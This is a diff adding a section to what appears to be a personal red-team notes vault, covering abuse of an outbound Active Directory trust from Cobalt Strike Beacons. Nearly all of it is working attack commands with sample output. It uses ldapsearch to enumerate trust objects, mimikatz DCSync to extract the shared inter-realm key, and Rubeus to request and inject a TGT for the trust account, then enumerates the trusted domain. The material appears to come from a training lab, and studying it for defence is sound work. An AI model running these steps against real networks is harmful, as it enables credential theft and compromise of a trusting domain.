@@ -63,3 +63,47 @@ run klist
 ls \\par-jmp-1.partner.com\c$
 ```
 
+##### Outbound Trust Abuse
+
+ Enumerate the one-way trust.
+```powershell
+ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatName
+```
+
+> **From the Medium-integrity Beacon**:
+
+Get the GUID of the TDO
+```powershell
+ldapsearch (objectClass=trustedDomain) --attributes name,objectGUID
+
+288d9ee6-2b3c-42aa-bef8-959ab4e484ed
+```
+
+ Obtain the shared inter-realm key from the TDO.
+```powershell
+mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}
+
+cc19dd9022fb33da79820c340e7c96765f237aa1a5a9dfe889a8f27af12c7a34
+6150491cceb080dffeaaec5e60d8f58d
+```
+
+ Request a TGT for the trust account using the shared secret.
+```powershell
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:PARTNER$ /domain:CONTOSO.COM /dc:lon-dc-1.contoso.com /nowrap /rc4:6150491cceb080dffeaaec5e60d8f58d
+```
+
+> **From the High-integrity Beacon**:
+
+Inject the TGT into a sacrifial logon session and verify
+```powershell
+make_token CONTOSO\PARTNER$ FakePass
+
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:
+
+run klist
+```
+
+Perform [enumeration](obsidian://open?vault=Offensive%20Security&file=root%2FRed%20Teaming%2FCobalt%20Strike%20Assumed%20Breach%2F8.%20Discovery%2F_%20Main) on the trusted domain, find roastable users, ADCS instances, etc.
+```powershell
+ldapsearch (objectClass=domain) --dn DC=contoso,DC=com --attributes name,objectSid --hostname contoso.com
+```
